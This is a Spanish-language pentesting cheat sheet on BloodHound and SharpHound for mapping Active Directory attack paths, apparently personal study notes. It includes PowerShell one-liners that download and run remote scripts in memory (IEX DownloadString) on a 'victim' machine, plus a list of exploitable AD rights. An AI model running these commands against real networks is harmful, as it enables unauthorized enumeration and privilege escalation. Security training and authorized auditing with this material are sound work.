# Bloodhound 

Tags: #AD #BloodHound #SharpHound 

**BloodHound** es una herramienta especializada en analizar y mapear relaciones dentro de Active Directory (AD). Su capacidad para identificar rutas de ataque y relaciones complejas la ha convertido en una herramienta esencial tanto para pentesters como para atacantes. A través de la recopilación y visualización de datos, permite descubrir configuraciones inseguras, privilegios excesivos y posibles vectores de escalación de privilegios o movimiento lateral en entornos AD, lo que la hace invaluable en auditorías de seguridad y pruebas de penetración.

```bash 
1. Visualización de Relaciones: BloodHound utiliza gráficos para mostrar las relaciones entre usuarios, grupos, computadoras y otros componentes en un AD. Estas visualizaciones hacen que sea más fácil para un atacante o pentester entender rápidamente las relaciones complejas y encontrar potenciales caminos de ataque.
    
2. Identificación de Caminos de Ataque: Uno de los principales valores de BloodHound es su capacidad para identificar caminos de escalada de privilegios y movimiento lateral. Al alimentar a BloodHound con datos recopilados, la herramienta puede identificar caminos específicos que un atacante puede seguir para escalar privilegios o moverse lateralmente a través de una red.
    
3. Automatización: La recopilación manual de detalles sobre las relaciones AD puede ser extremadamente lenta y tediosa. BloodHound, junto con su componente de recopilación de datos llamado SharpHound, automatiza gran parte de este proceso, permitiendo a los pentesters recopilar y analizar datos rápidamente.
    
4. Identificación de Vulnerabilidades Comunes: BloodHound también puede identificar patrones comunes que a menudo son vulnerables a la explotación, como configuraciones de delegación inseguras, miembros excesivamente permisivos en grupos de alto privilegio, y usuarios que tienen derechos de sesión local en sistemas críticos.
    
5. Capacidades de Análisis Avanzado: Aparte de identificar caminos obvios, BloodHound puede ayudar a identificar relaciones no evidentes que podrían ser explotadas. Por ejemplo, un usuario podría no tener privilegios directos sobre un recurso, pero a través de una serie de relaciones y delegaciones, podría tener una ruta de acceso indirecto.
    
6. Capacitación y Conciencia: Para defensores y equipos de seguridad, BloodHound también puede ser una herramienta valiosa. Al visualizar la estructura de permisos y las relaciones dentro de AD, los defensores pueden anticiparse a potenciales vías de ataque y tomar medidas para mitigar los riesgos.
```

## SharpHound 

* [SharpHound](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)

```powershell
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); 
❯ Invoke-BloodHound -CollectionMethod All     

Nota: Estos comandos los ejecutamos en la maquina victima Windows para recolectar la información y obtener un archivo '.zip' el cual pasaremos a la herramienta de 'BloodHound' para el analisis 
```

* [ADPeas](https://github.com/61106960/adPEAS)

```powershell 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')

❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada

Nota: Podemos usar ADPeas para hacer la recolección ya que automaticamente ejecuta 'SharpHound'
```

## BloodHount 

* [BloodHound](https://github.com/SpecterOps/BloodHound-Legacy/releases)
* [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries)

```bash 
❯ neo4j console                   # Iniciamos la base de datos
❯ ./BloodHound --no-sandbox       # Despues de descargar el binario lo ejecutamos 
```

## Tipos de ActiveDirectoryRights

```bash 
Los 'ActiveDirectoryRights' incluyen, pero no se limitan a:

1. Read/Write: Leer y escribir información en objetos de AD.
2. Delete: Derechos para eliminar objetos.
3. CreateChild/DeleteChild: Crear o eliminar objetos hijos en un contenedor.
4. Self: Derechos para modificar información propia.
5. GenericAll: Control total sobre el objeto, incluyendo todos los derechos anteriores.
6. WriteDacl: Modificar la lista de control de acceso discrecional (DACL).  
7. WriteOwner: Cambiar el propietario de un objeto.
```